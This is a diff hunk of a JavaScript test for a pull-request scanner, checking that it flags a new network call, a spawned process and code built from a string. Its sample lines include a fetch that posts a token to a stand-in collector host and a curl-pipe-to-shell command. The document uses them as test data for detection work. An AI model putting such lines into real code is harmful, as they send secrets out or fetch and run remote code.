@@ -94,7 +94,7 @@ describe('lines worth reading twice, which point the reviewer and decide nothing
   it('points at a new network call, a spawned process and code built from a string', () => {
     const diff = diffOf('main/x.mjs', [
       "await fetch('https://collector.example/x', { method: 'POST', body: token });",
-      "execSync('curl -s https://example.sh | sh');",
+      "execSync('curl -s https://example.sh | sh');", // public-check: allow (the fake the scan must flag)
       'const f = new Function(src);',
     ]);
     const flags = scanPullRequest({ files: [{ path: 'main/x.mjs', additions: 3, deletions: 0 }], diff });
